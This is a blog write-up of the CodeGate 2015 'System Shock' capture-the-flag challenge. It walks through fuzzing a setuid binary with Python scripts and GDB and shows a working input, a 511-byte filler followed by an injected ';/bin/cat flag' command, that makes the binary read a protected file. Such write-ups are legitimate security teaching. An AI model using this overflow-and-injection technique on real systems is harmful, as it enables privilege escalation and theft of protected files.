---
id: 246
title: 'CodeGate 2015 - System Shock Pwnable'
date: 2015-03-16T10:51:00+00:00
author: Kris
layout: post
guid: http://ctf.rip/?p=246
permalink: /codegate-2015-system-shock-pwnable/
post_views_count:
  - "545"
categories:
  - Write-Ups
tags:
  - "2015"
---
For this years CodeGate teams faced some ingenious challenges. Today I will write up the first challenge we solved which seems to have also been first for many of the teams. This challenge is Systemshock.

>description  
>Login : ssh systemshock@54.65.236.17  
>Password : systemshocked  

Upon logging in you are placed into the systemshock user home path with the following files:

```
systemshock@ip-172-31-3-97:~$ ls -la  
 total 32  
 drwxr-xr-x 2 systemshock    systemshock 4096 Mar 14 08:59 .  
 drwxr-xr-x 5 root        root    4096 Mar 12 19:40 ..  
 lrwxrwxrwx 1 root        root      9 Mar 14 08:59 .bash_history -> /dev/null  
 -rw-r--r-- 1 systemshock    systemshock 220 Mar 12 19:34 .bash_logout  
 -rw-r--r-- 1 systemshock    systemshock 3392 Mar 12 19:34 .bashrc  
 -r-------- 1 systemshock-solved root     56 Mar 14 08:59 flag  
 -rw-r--r-- 1 systemshock    systemshock 675 Mar 12 19:34 .profile  
 -rwsr-xr-x 1 systemshock-solved systemshock 5504 Mar 12 20:07 shock  
 lrwxrwxrwx 1 root        root      9 Mar 14 08:59 .viminfo -> /dev/null  
```

We cant read the flag right now because its owned by user systemshock-solved and is mode 0400:

```
systemshock@ip-172-31-3-97:~$ cat flag  
 cat: flag: Permission denied  
```

The shock file is a Linux ELF binary program that is setuid and executable:

```
systemshock@ip-172-31-3-97:~$ file shock  
 shock: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26, BuildID[sha1]=0x15fb3a120bea64fa53993f6552d52d9e1370a5a9, stripped  
```

Upon executing the setuid binary "shock" with no arguments we get no output

```
systemshock@ip-172-31-3-97:~$ ./shock  
 systemshock@ip-172-31-3-97:~$  
```
Feeding it a test string we get the output of what looks like the /usr/bin/id command:

```
systemshock@ip-172-31-3-97:~$ ./shock test  
 id: test: No such user  
```

That's cool, so this binary is executing "id" with the arguments we feed it? Sweet, lets validate our theory:

```
systemshock@ip-172-31-3-97:~$ ./shock systemshock  
 uid=1002(systemshock) gid=1002(systemshock) groups=1002(systemshock)  
 systemshock@ip-172-31-3-97:~$ ./shock root  
 uid=0(root) gid=0(root) groups=0(root)  
```

Ok so we assume it's running the "id" command with escalated privileges since the binary is setuid, the binary is setuid user "systemshock-solved". So our first thought is that this must be a command injection vulnerability. So I test the obvious thing first:

```
systemshock@ip-172-31-3-97:~$ ./shock "root;cat flag"  
 systemshock@ip-172-31-3-97:~$  
```

Ok! So that didn't work... but why?

Next thing we do is download the shock binary. To download it I was very lazy so just ran "base64 shock" and then copy/pasted the base64 encoded file to my Kali linux system which i then ran base64 -d against.

With the binary on my local system I was able to do several things, firstly I loaded the binary in IDA Pro to check for obvious things. Static analysis was slow without symbols so I loaded it into GDB and dynamically analysed the steps.

Firstly I deduced the main function entry point and set breakpoints at obvious branch locations that I found during static analysis with IDA Pro.

Next I stepped through execution with acceptable values of argv (e.g. valid usernames) and unacceptable values (e,g. command injection attempts containing semicolons).

What I was able to find is pretty obvious in that it loops through the command line argument byte by byte and exits when any character not in the A-Za-z0-9 set is found. This pretty much excludes any form of simple command injection here by string manipulation so it was time to look elsewhere.

Next lets try another obvious point; maybe we can fuzz this binary to investigate the possibility of controlling execution flow of the escalated process? A stack overflow would do the trick if we can control EIP maybe...

```
systemshock@ip-172-31-3-97:~$ ./shock `perl -e 'print "A" x 100'`  
 id: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: No such user  
 systemshock@ip-172-31-3-97:~$ ./shock `perl -e 'print "A" x 1000'`  
 Segmentation fault  
```

Ok so it crashes when fed a long argv, cool, lets look into why?

```
root@mankrik:~/codegate# gdb ./shock  
 GNU gdb (GDB) 7.4.1-debian  
 Copyright (C) 2012 Free Software Foundation, Inc.  
 License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>  
 This is free software: you are free to change and redistribute it.  
 There is NO WARRANTY, to the extent permitted by law. Type "show copying"  
 and "show warranty" for details.  
 This GDB was configured as "x86_64-linux-gnu".  
 For bug reporting instructions, please see:  
 <http://www.gnu.org/software/gdb/bugs/>...  
 Reading symbols from /root/codegate/shock...(no debugging symbols found)...done.  
 (gdb) r `perl -e 'print "A" x 1000'`  
 Starting program: /root/codegate/shock `perl -e 'print "A" x 1000'`  
 warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000  
 Program received signal SIGSEGV, Segmentation fault.  
 0x00007ffff7b6c8cf in ?? () from /lib/x86_64-linux-gnu/libc.so.6  
 (gdb) i r  
 rax      0x4141414141414141     4702111234474983745  
 rbx      0x0     0  
 rcx      0x1     1  
 rdx      0x7fffffffe16b     140737488347499  
 rsi      0x7fffffffe620     140737488348704  
 rdi      0x4141414141414140     4702111234474983744  
 rbp      0x7fffffffdea0     0x7fffffffdea0  
 rsp      0x7fffffffdd58     0x7fffffffdd58  
 r8       0x4141414141414141     4702111234474983745  
 r9       0xfefefefefefeff40     -72340172838076608  
 r10      0x0     0  
 r11      0x7ffff7ad0090     140737348698256  
 r12      0x400650     4195920  
 r13      0x7fffffffdf80     140737488347008  
 r14      0x0     0  
 r15      0x0     0  
 rip      0x7ffff7b6c8cf     0x7ffff7b6c8cf  
 eflags     0x10202     [ IF RF ]  
 cs       0x33     51  
 ss       0x2b     43  
 ds       0x0     0  
 es       0x0     0  
 fs       0x0     0  
 ---Type <return> to continue, or q <return> to quit---q  
 Quit  
 (gdb)   
```

So we did crash it, but not in a super useful and easy to use way yet. We could look further into this crash but first let's look at using different length strings to see if we can crash in other places that might be a quick win instead.

*Note*: I would not advise trying this on the live CTF server, that may get you banned!:

```
#!/usr/bin/python  
 import os  
 for i in range(100,1000):  
      buf = 'A' * i  
      cmd = "./shock "+ buf  
      print str(i) + ":"  
      os.system(cmd)       
```

It spits out information like this.

```
351:  
 id: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: No such user  
 *** stack smashing detected ***: ./shock terminated  
 Segmentation fault  
 352:  
 id: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: No such user  
 *** stack smashing detected ***: ./shock terminated  
 Segmentation fault  
 353:  
 id: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: No such user  
 *** stack smashing detected ***: ./shock terminated  
 Segmentation fault  
 354:  
 id: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: No such user  
 *** stack smashing detected ***: ./shock terminated  
 Segmentation fault  
```

What's interesting in the output is that there's a few separate crashes with different symptoms, right at about the 527 byte area it looks like were crashing in a different place.

```
526:  
 id: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: No such user  
 Segmentation fault  
 527:  
 Segmentation fault  
```

On the off chance we can take advantage of a different code path in the program, let's try a slightly modified python script.

I've added a key piece below (the inject string) and added a file on my local system called "flag" with the text "You got a flag!"

```
#!/usr/bin/python  
 import os  
 inject = '";/bin/cat flag"'  
 for i in range(100,1000):  
      buf = 'A' * i  
      cmd = "./shock "+ buf + inject  
      print str(i) + ":"  
      os.system(cmd)       
```

When I ran this on my local system, I was "shocked" to see this output right around the 511 byte buffer size mark. This only worked at 2 different offsets, 511 bytes and 512 bytes.

```
511:  
 id: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: No such user  
 You got a flag!  
 Segmentation fault  
```

So let's take a command line argument of exactly 511 x A's and the string ";/bin/cat flag" and paste it onto the live system:

```
systemshock@ip-172-31-3-97:~$ ./shock AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";/bin/cat flag"  
id: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: No such user  
B9sdeage OVvn23oSx0ds9^^to NVxqjy is_extremely Hosx093t  
Segmentation fault  
```

And there is our flag! What an unusual challenge but a fun simple way to get into Code Gate 2015!

It's true to say we did NOT look into why this worked yet but I plan on spending some quality time with GDB to add a part 2 to this write up soon.

Writeup by: Dacat